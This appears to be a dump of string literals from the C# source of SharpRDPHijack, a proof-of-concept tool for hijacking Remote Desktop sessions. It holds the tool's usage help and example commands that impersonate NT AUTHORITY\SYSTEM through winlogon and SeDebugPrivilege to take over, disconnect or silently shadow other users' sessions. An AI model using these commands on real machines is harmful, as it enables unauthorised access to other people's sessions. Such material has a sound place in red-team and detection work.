"""    - For session hijacking, this utility must be run in an elevated context to connect to another session"
"""    - For session query, admin privileges or \"
"""    - If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated"
"""    --console : Redirect session to console session instead of current (active) session"
"""    --disconnect : Disconnect an active (remote) session\n"
"""    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)"
"""    --session=<ID> : Target session identifier"
"""    --shadow : Shadow an active session (experimental)"
"""    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)"
"""    SharpRDPHijack.exe --session=2 --console\n"
"""    SharpRDPHijack.exe --session=2 --shadow --console\n"
"""    SharpRDPHijack.exe --session=3 --disconnect\n"
"""    SharpRDPHijack.exe --session=3 --shadow\n"
"""    SharpRDPHijack.exe --session=4 --password=P@ssw0rd\n"
"""    SharpRDPHijack.exe --session=6\n"
"""    SharpRDPHijack.exe --tsquery=localhost\n"
""" + e.Message + "
""" + ex.Message.ToString() + "
""" + proc + "
""" + session.ToString() + "
""" + sessionId.ToString() + @"
""" + si.SessionId.ToString() + "
""" /control /noConsentPrompt"
""" [Console]"
""" group membership is required on the target machine\n"
""") + @"
"""----------------\nSharp RDP Hijack\n----------------\n"
"""--console"
"""--disconnect"
"""--password="
"""--session="
"""--shadow"
"""--tsquery="
"""/shadow:"
"""AS IS"
"""Active"
"""ConnectQuery"
"""Connecting"
"""Disconnected"
"""Down due to error"
"""Identity: "
"""Idle and waiting for connection"
"""Listening for a connection"
"""Remote Desktop Users"
"""Remote Desktop Users\"
"""Resetting a connection"
"""SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
"""SeDebugPrivilege"
"""SeTimeZonePrivilege"
"""Session State: "
"""Shadow"
"""Shadowing"
"""SystemRoot"
"""Unknown"
"""[*] A proof-of-concept Remote Desktop (RDP) session hijack utility"
"""[*] Example Usage 1: Impersonate NT AUTHORITY\\SYSTEM to hijack session #6 and redirect to the current session"
"""[*] Example Usage 2: Impersonate NT AUTHORITY\\SYSTEM to hijack session #2 and redirect to the console session"
"""[*] Example Usage 3: Hijack Remote Desktop session #4 with knowledge of the logged-on user's password"
"""[*] Example Usage 4: Disconnect active session #3"
"""[*] Example Usage 5: Query the local host for RDP/TS session information"
"""[*] Example Usage 6: Shadow active session #3"
"""[*] Example Usage 7: Shadow inactive session #2 by redirecting the session to the console"
"""[*] Parameters:"
"""\System32\mstsc.exe"
"""\\"
"""\n [-] Error: "
"""\n"
"""\nSession ID: "
"""\n[-] Could not adjust token privilege: SeDebugPrivilege\n"
"""\n[-] Could not impersonate target context from process: "
"""\n[-] Error: "
"""\n[-] Failed to connect to session: "
"""\n[-] For RDP hijack, this program must be run in elevated administrator context\n"
"""\n[-] For RDP session query, only use the '--tsquery' switch\n"
"""advapi32.dll"
"""initializing"
"""kernel32.dll"
"""winlogon"
"""wtsapi32.dll"
